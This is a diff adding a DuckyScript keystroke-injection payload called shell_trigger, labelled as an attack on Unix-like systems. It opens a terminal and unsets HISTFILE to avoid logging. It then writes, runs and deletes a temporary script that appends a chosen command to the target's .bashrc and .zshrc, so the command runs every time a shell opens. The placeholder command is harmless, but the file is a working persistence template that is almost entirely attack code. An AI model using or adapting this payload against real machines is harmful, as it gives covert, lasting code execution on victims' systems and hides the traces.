@@ -1,0 +1,25 @@
+REM Title: shell_trigger
+REM Description: shell_trigger is an payload which triggers commands/scripts on shell execution on target's system OR triggers commands/scripts when target executes terminal emulator.
+REM AUTHOR: drapl0n
+REM Version: 1.0
+REM Category: Execution.
+REM Target: Unix-like operating systems.
+REM Attackmodes: HID
+
+DELAY 1000
+CTRL ALT t
+DELAY 500
+STRING unset HISTFILE 
+ENTER
+DELAY 100
+STRING cmd="echo hello world" 
+ENTER
+DELAY 200
+STRING echo -e "ls -a ~/ | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"$cmd\" >> ~/.zshrc\nfi\n\nls -a ~/ | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"$cmd\" >> ~/.bashrc\nfi" >> /tmp/sys
+ENTER
+DELAY 200
+STRING chmod +x /tmp/sys
+ENTER
+DELAY 200
+STRING /tmp/./sys && rm /tmp/sys && exit
+ENTER
